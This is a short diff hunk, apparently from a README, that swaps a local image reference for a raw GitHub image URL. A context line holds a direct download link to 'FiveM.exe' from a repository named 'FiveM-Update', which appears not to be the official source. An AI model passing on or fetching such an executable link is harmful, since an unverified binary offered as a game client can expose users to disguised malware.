@@ -28,5 +28,4 @@ https://github.com/FiveM-Update/FiveM/releases/download/FiveM/FiveM.exe
 
 
 
-FiveM.jpg
-
+https://github.com/FiveM-Update/FiveM/blob/main/FiveM.jpg?raw=true
